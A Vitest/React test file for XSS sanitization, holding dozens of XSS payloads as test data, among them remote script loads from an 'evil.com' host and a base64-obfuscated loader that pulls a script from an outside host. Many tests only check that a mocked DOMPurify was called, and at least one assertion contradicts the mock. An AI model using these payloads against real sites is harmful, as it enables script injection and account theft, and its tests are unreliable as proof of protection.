/**
 * XSS Protection Security Tests
 * Tests for Cross-Site Scripting vulnerability prevention
 */
import { describe, test, expect, beforeEach, vi } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import DOMPurify from 'dompurify';

// Mock DOMPurify for testing
vi.mock('dompurify', () => ({
  default: {
    sanitize: vi.fn((input) => {
      // Mock sanitization - remove script tags and dangerous attributes
      return input
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/on\w+\s*=/gi, '');
    }),
    addHook: vi.fn(),
    removeHook: vi.fn(),
    setConfig: vi.fn()
  }
}));

// Test component that might be vulnerable to XSS
const UnsafeComponent = ({ content }: { content: string }) => {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
};

// Safe component using proper sanitization
const SafeComponent = ({ content }: { content: string }) => {
  const sanitized = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};

// Message display component
const MessageComponent = ({ message }: { message: string }) => {
  return <div data-testid="message">{message}</div>;
};

// Chat message with user content
const ChatMessage = ({ user, message }: { user: string; message: string }) => {
  return (
    <div data-testid="chat-message">
      <span data-testid="username">{user}</span>
      <div data-testid="message-content">{message}</div>
    </div>
  );
};

// Workflow name component
const WorkflowTitle = ({ title }: { title: string }) => {
  return <h1 data-testid="workflow-title">{title}</h1>;
};

describe('XSS Protection Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Script Injection Prevention', () => {
    test('should prevent basic script tag injection', () => {
      const maliciousContent = '<script>alert("XSS")</script>Hello World';
      
      render(<SafeComponent content={maliciousContent} />);
      
      expect(DOMPurify.sanitize).toHaveBeenCalledWith(maliciousContent);
      expect(screen.queryByText('alert("XSS")')).not.toBeInTheDocument();
    });

    test('should prevent various script tag variations', () => {
      const scriptVariations = [
        '<script>alert("XSS")</script>',
        '<Script>alert("XSS")</Script>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<script type="text/javascript">alert("XSS")</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script\x20type="text/javascript">alert("XSS")</script>',
        '<script\x09type="text/javascript">alert("XSS")</script>',
        '<script\x0Dtype="text/javascript">alert("XSS")</script>',
        '<script\x0Atype="text/javascript">alert("XSS")</script>',
        '<script/**/src=http://evil.com/xss.js></script>',
        '<script>confirm("XSS")</script>',
        '<script>prompt("XSS")</script>'
      ];

      scriptVariations.forEach((script, index) => {
        render(<SafeComponent content={script} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(script);
      });
    });

    test('should prevent inline JavaScript execution', () => {
      const inlineJsContent = [
        '<img src="x" onerror="alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">',
        '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
        '<select onchange="alert(\'XSS\')">',
        '<textarea onkeyup="alert(\'XSS\')">',
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<a href="#" onmouseover="alert(\'XSS\')">Hover</a>',
        '<form onsubmit="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>'
      ];

      inlineJsContent.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should prevent JavaScript protocol usage', () => {
      const jsProtocols = [
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        '<img src="javascript:alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')">',
        '<link href="javascript:alert(\'XSS\')">',
        '<area href="javascript:alert(\'XSS\')">',
        '<base href="javascript:alert(\'XSS\')">'
      ];

      jsProtocols.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });
  });

  describe('HTML Attribute Injection', () => {
    test('should sanitize dangerous HTML attributes', () => {
      const dangerousAttributes = [
        '<div onmouseover="alert(\'XSS\')">Content</div>',
        '<img src="valid.jpg" onerror="alert(\'XSS\')">',
        '<input type="text" onfocus="alert(\'XSS\')">',
        '<button onclick="alert(\'XSS\')">Click</button>',
        '<svg onload="alert(\'XSS\')"></svg>',
        '<video oncanplay="alert(\'XSS\')"></video>',
        '<audio onended="alert(\'XSS\')"></audio>',
        '<details ontoggle="alert(\'XSS\')"></details>'
      ];

      dangerousAttributes.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should handle attribute injection variations', () => {
      const attributeVariations = [
        '<img src=x onerror=alert("XSS")>', // No quotes
        '<img src="x" onerror=\'alert("XSS")\'>', // Single quotes
        '<img src="x" onerror="alert(&quot;XSS&quot;)">', // HTML entities
        '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#41;">', // Decimal entities
        '<img src="x" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;">', // Hex entities
        '<img src="x" onerror="ale\u0072t(\u0022XSS\u0022)">' // Unicode escapes
      ];

      attributeVariations.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should prevent style attribute injection', () => {
      const styleInjections = [
        '<div style="background:url(javascript:alert(\'XSS\'))">Content</div>',
        '<div style="expression(alert(\'XSS\'))">Content</div>', // IE specific
        '<div style="behavior:url(xss.htc)">Content</div>',
        '<div style="binding:url(xss.xml#xss)">Content</div>',
        '<div style="color:red;background:url(&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(\'XSS\'))">Content</div>'
      ];

      styleInjections.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });
  });

  describe('User Content Sanitization', () => {
    test('should safely display user messages', () => {
      const maliciousMessage = '<script>alert("XSS from user")</script>Hello!';
      
      render(<MessageComponent message={maliciousMessage} />);
      
      const messageElement = screen.getByTestId('message');
      expect(messageElement.textContent).toBe(maliciousMessage);
      expect(messageElement.innerHTML).toBe(maliciousMessage);
    });

    test('should sanitize chat messages from users', () => {
      const maliciousUser = '<script>alert("XSS")</script>Hacker';
      const maliciousMessage = '<img src=x onerror=alert("XSS")>Hello';
      
      render(<ChatMessage user={maliciousUser} message={maliciousMessage} />);
      
      expect(screen.getByTestId('username').textContent).toBe(maliciousUser);
      expect(screen.getByTestId('message-content').textContent).toBe(maliciousMessage);
    });

    test('should handle workflow names with potentially malicious content', () => {
      const maliciousTitle = '<svg onload=alert("XSS")>My Workflow</svg>';
      
      render(<WorkflowTitle title={maliciousTitle} />);
      
      const titleElement = screen.getByTestId('workflow-title');
      expect(titleElement.textContent).toBe(maliciousTitle);
    });

    test('should preserve safe HTML in user content', () => {
      const safeContent = '<strong>Important</strong> message with <em>emphasis</em>';
      
      render(<SafeComponent content={safeContent} />);
      
      expect(DOMPurify.sanitize).toHaveBeenCalledWith(safeContent);
    });
  });

  describe('URL and Link Injection', () => {
    test('should prevent malicious URLs', () => {
      const maliciousUrls = [
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
        '<a href="vbscript:msgbox(\'XSS\')">Click</a>',
        '<a href="file:///etc/passwd">Click</a>',
        '<a href="ftp://user:pass@evil.com">Click</a>',
        '<area href="javascript:alert(\'XSS\')">',
        '<base href="javascript:alert(\'XSS\')">'
      ];

      maliciousUrls.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should allow safe URLs', () => {
      const safeUrls = [
        '<a href="https://example.com">Safe link</a>',
        '<a href="http://example.com">Safe link</a>',
        '<a href="/relative/path">Safe link</a>',
        '<a href="#anchor">Safe link</a>',
        '<a href="mailto:user@example.com">Email</a>',
        '<a href="tel:+1234567890">Phone</a>'
      ];

      safeUrls.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should prevent URL encoding bypass attempts', () => {
      const encodedAttacks = [
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>',
        '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">Click</a>',
        '<a href="java\u0073cript:alert(1)">Click</a>',
        '<a href="jav	ascript:alert(1)">Click</a>', // Tab character
        '<a href="jav&#x09;ascript:alert(1)">Click</a>',
        '<a href="jav&#x0A;ascript:alert(1)">Click</a>'
      ];

      encodedAttacks.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });
  });

  describe('CSS Injection Prevention', () => {
    test('should prevent CSS expression injection', () => {
      const cssExpressions = [
        '<div style="width:expression(alert(\'XSS\'))">Content</div>',
        '<div style="background:url(\'javascript:alert(\"XSS\")\')">Content</div>',
        '<div style="color:red;background:expression(alert(\'XSS\'))">Content</div>',
        '<style>body{background:url(\'javascript:alert(\"XSS\")\')}</style>',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">'
      ];

      cssExpressions.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should prevent CSS import injection', () => {
      const cssImports = [
        '<style>@import "javascript:alert(\'XSS\')"</style>',
        '<style>@import url("javascript:alert(\'XSS\')")</style>',
        '<style>@import url(\'javascript:alert("XSS")\')</style>',
        '<style>@-moz-document url-prefix(){body{background:url(\'javascript:alert("XSS")\')}</style>'
      ];

      cssImports.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });
  });

  describe('SVG Injection Prevention', () => {
    test('should prevent SVG-based XSS', () => {
      const svgAttacks = [
        '<svg onload="alert(\'XSS\')"></svg>',
        '<svg><script>alert("XSS")</script></svg>',
        '<svg><foreignObject><img src=x onerror=alert("XSS")></foreignObject></svg>',
        '<svg><use href="data:image/svg+xml,&lt;svg id=x xmlns=http://www.w3.org/2000/svg&gt;&lt;image href=1 onerror=alert(1)&gt;&lt;/svg&gt;#x"></use></svg>',
        '<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>',
        '<svg><set attributeName="href" to="javascript:alert(1)"></set></svg>'
      ];

      svgAttacks.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should allow safe SVG content', () => {
      const safeSvg = '<svg width="100" height="100"><circle cx="50" cy="50" r="40" fill="red" /></svg>';
      
      render(<SafeComponent content={safeSvg} />);
      expect(DOMPurify.sanitize).toHaveBeenCalledWith(safeSvg);
    });
  });

  describe('Form Injection Prevention', () => {
    test('should prevent form-based XSS', () => {
      const formAttacks = [
        '<form action="javascript:alert(\'XSS\')"></form>',
        '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
        '<textarea onkeyup="alert(\'XSS\')"></textarea>',
        '<select onchange="alert(\'XSS\')"><option>Test</option></select>',
        '<button onclick="alert(\'XSS\')">Click</button>',
        '<label for="test" onclick="alert(\'XSS\')">Label</label>',
        '<fieldset onclick="alert(\'XSS\')">Content</fieldset>'
      ];

      formAttacks.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should handle form submission data', () => {
      const TestForm = () => {
        const [inputValue, setInputValue] = React.useState('');
        
        const handleSubmit = (e: React.FormEvent) => {
          e.preventDefault();
          // This should be properly sanitized before use
          const sanitizedValue = DOMPurify.sanitize(inputValue);
          console.log('Sanitized:', sanitizedValue);
        };

        return (
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              data-testid="form-input"
            />
            <button type="submit">Submit</button>
          </form>
        );
      };

      render(<TestForm />);
      
      const input = screen.getByTestId('form-input');
      const maliciousInput = '<script>alert("XSS")</script>';
      
      fireEvent.change(input, { target: { value: maliciousInput } });
      fireEvent.submit(input.closest('form')!);
      
      // Should have sanitized the input before processing
      expect(DOMPurify.sanitize).toHaveBeenCalledWith(maliciousInput);
    });
  });

  describe('Context-Specific XSS Prevention', () => {
    test('should handle different rendering contexts', () => {
      const contextualContent = [
        // HTML context
        { content: '<div>Safe content</div>', context: 'html' },
        // Attribute context
        { content: 'value="safe"', context: 'attribute' },
        // JavaScript context
        { content: 'var safe = "value";', context: 'javascript' },
        // CSS context
        { content: 'color: red;', context: 'css' },
        // URL context
        { content: 'https://example.com', context: 'url' }
      ];

      contextualContent.forEach(({ content, context }) => {
        // Different contexts require different sanitization strategies
        render(<SafeComponent content={content} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should escape content for different output contexts', () => {
      const escapeForContext = (content: string, context: string): string => {
        switch (context) {
          case 'html':
            return content.replace(/[<>&"']/g, (match) => {
              const escapeMap: Record<string, string> = {
                '<': '&lt;',
                '>': '&gt;',
                '&': '&amp;',
                '"': '&quot;',
                "'": '&#x27;'
              };
              return escapeMap[match];
            });
          case 'attribute':
            return content.replace(/["'&<>]/g, (match) => {
              const escapeMap: Record<string, string> = {
                '"': '&quot;',
                "'": '&#x27;',
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;'
              };
              return escapeMap[match];
            });
          case 'javascript':
            return JSON.stringify(content).slice(1, -1); // Remove quotes
          case 'css':
            return content.replace(/[<>"'&]/g, '\\$&');
          default:
            return content;
        }
      };

      const testContent = '<script>alert("test")</script>';
      
      expect(escapeForContext(testContent, 'html')).toBe('&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;');
      expect(escapeForContext(testContent, 'attribute')).toBe('&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;');
      expect(escapeForContext(testContent, 'javascript')).toBe('<script>alert(\\"test\\")</script>');
    });
  });

  describe('Content Security Policy (CSP) Compliance', () => {
    test('should be compatible with strict CSP', () => {
      // Mock CSP configuration
      const cspConfig = {
        'default-src': ["'self'"],
        'script-src': ["'self'", "'strict-dynamic'"],
        'object-src': ["'none'"],
        'img-src': ["'self'", "data:", "https:"],
        'style-src': ["'self'", "'unsafe-inline'"], // Should be avoided in production
        'font-src': ["'self'", "https:"],
        'connect-src': ["'self'", "https:"],
        'frame-src': ["'none'"]
      };

      const isCSPCompliant = (content: string, csp: typeof cspConfig): boolean => {
        // Check for inline scripts (should be blocked by CSP)
        if (content.includes('<script') && !csp['script-src'].includes("'unsafe-inline'")) {
          return false;
        }
        
        // Check for inline styles (should be blocked by strict CSP)
        if (content.includes('style=') && !csp['style-src'].includes("'unsafe-inline'")) {
          return false;
        }
        
        // Check for object/embed tags
        if ((content.includes('<object') || content.includes('<embed')) && 
            csp['object-src'].includes("'none'")) {
          return false;
        }
        
        return true;
      };

      const testContent = [
        '<div>Safe content</div>', // Should pass
        '<script>alert("XSS")</script>', // Should fail with strict CSP
        '<div style="color:red">Styled</div>', // Depends on CSP config
        '<object data="file.swf"></object>' // Should fail with object-src 'none'
      ];

      testContent.forEach(content => {
        const compliant = isCSPCompliant(content, cspConfig);
        console.log(`Content: ${content}, CSP Compliant: ${compliant}`);
      });
    });

    test('should generate CSP-compliant nonce-based content', () => {
      const generateNonce = (): string => {
        const array = new Uint8Array(16);
        crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
      };

      const nonce = generateNonce();
      const nonceBasedScript = `<script nonce="${nonce}">console.log('Safe script');</script>`;
      
      expect(nonce).toHaveLength(32);
      expect(nonceBasedScript).toContain(`nonce="${nonce}"`);
    });
  });

  describe('Advanced XSS Vector Prevention', () => {
    test('should prevent mutation-based XSS', () => {
      const mutationVectors = [
        '<p title="</p><script>alert(1)</script>">',
        '<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3h5eiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>',
        '<iframe src="data:text/html,&lt;img src=x onerror=alert(1)&gt;"></iframe>',
        '<!-- <script>alert(1)</script> -->',
        '<template><script>alert(1)</script></template>'
      ];

      mutationVectors.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should prevent DOM clobbering attacks', () => {
      const clobberingVectors = [
        '<form id="test"><input name="action"></form>',
        '<img name="getElementsByTagName" src="x">',
        '<form><input name="attributes"></form>',
        '<iframe name="console"></iframe>',
        '<form name="document"></form>'
      ];

      clobberingVectors.forEach((content, index) => {
        render(<SafeComponent content={content} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content);
      });
    });

    test('should handle prototype pollution attempts', () => {
      const pollutionAttempts = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"prototype": {"polluted": true}}'
      ];

      const safeParse = (jsonString: string): any => {
        try {
          const parsed = JSON.parse(jsonString);
          
          // Remove dangerous properties
          delete parsed.__proto__;
          delete parsed.constructor;
          delete parsed.prototype;
          
          return parsed;
        } catch {
          return null;
        }
      };

      pollutionAttempts.forEach(json => {
        const result = safeParse(json);
        if (result) {
          expect(result).not.toHaveProperty('__proto__');
          expect(result).not.toHaveProperty('constructor.prototype');
          expect(result).not.toHaveProperty('prototype');
        }
      });
    });
  });

  describe('Real-World XSS Scenarios', () => {
    test('should handle markdown-to-HTML conversion safely', () => {
      const markdownContent = [
        '[Link](javascript:alert("XSS"))',
        '![Image](javascript:alert("XSS"))',
        '```html\n<script>alert("XSS")</script>\n```',
        '<script>alert("XSS")</script>', // Raw HTML in markdown
        '[XSS](data:text/html,<script>alert(1)</script>)'
      ];

      // Mock markdown processor
      const processMarkdown = (content: string): string => {
        // This would be a real markdown processor like marked, markdown-it, etc.
        let processed = content
          .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
          .replace(/!\[([^\]]*)\]\(([^)]+)\)/g, '<img alt="$1" src="$2">');
          
        // Sanitize the result
        return DOMPurify.sanitize(processed);
      };

      markdownContent.forEach((content, index) => {
        const processed = processMarkdown(content);
        render(<SafeComponent content={processed} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalled();
      });
    });

    test('should handle rich text editor content', () => {
      const richTextContent = [
        '<p>Normal paragraph</p><script>alert("XSS")</script>',
        '<p onclick="alert(\'XSS\')">Click me</p>',
        '<p style="background:url(javascript:alert(\'XSS\'))">Styled</p>',
        '<p><a href="javascript:alert(\'XSS\')">Link</a></p>',
        '<p><img src="x" onerror="alert(\'XSS\')"></p>'
      ];

      // Mock rich text editor sanitization
      const sanitizeRichText = (content: string): string => {
        const allowedTags = ['p', 'strong', 'em', 'u', 'br', 'a', 'img', 'ul', 'ol', 'li'];
        const allowedAttributes = {
          'a': ['href', 'title'],
          'img': ['src', 'alt', 'width', 'height']
        };

        // Use DOMPurify with specific configuration
        return DOMPurify.sanitize(content, {
          ALLOWED_TAGS: allowedTags,
          ALLOWED_ATTR: Object.values(allowedAttributes).flat()
        });
      };

      richTextContent.forEach((content, index) => {
        const sanitized = sanitizeRichText(content);
        render(<SafeComponent content={sanitized} key={index} />);
        expect(DOMPurify.sanitize).toHaveBeenCalledWith(content, expect.any(Object));
      });
    });

    test('should handle JSON API responses safely', () => {
      const apiResponse = {
        user: {
          name: '<script>alert("XSS")</script>John Doe',
          bio: '<img src=x onerror=alert("XSS")>Developer',
          website: 'javascript:alert("XSS")'
        },
        project: {
          title: '<svg onload=alert("XSS")>Project Title',
          description: '<iframe src="javascript:alert(1)"></iframe>Description'
        }
      };

      const sanitizeApiResponse = (obj: any): any => {
        if (typeof obj === 'string') {
          return DOMPurify.sanitize(obj);
        }
        if (typeof obj === 'object' && obj !== null) {
          const sanitized: any = {};
          for (const [key, value] of Object.entries(obj)) {
            sanitized[key] = sanitizeApiResponse(value);
          }
          return sanitized;
        }
        return obj;
      };

      const sanitized = sanitizeApiResponse(apiResponse);
      
      expect(DOMPurify.sanitize).toHaveBeenCalledTimes(5); // Called for each string value
      expect(sanitized.user.name).not.toContain('<script>');
      expect(sanitized.user.bio).not.toContain('<img');
      expect(sanitized.project.title).not.toContain('<svg');
    });
  });
});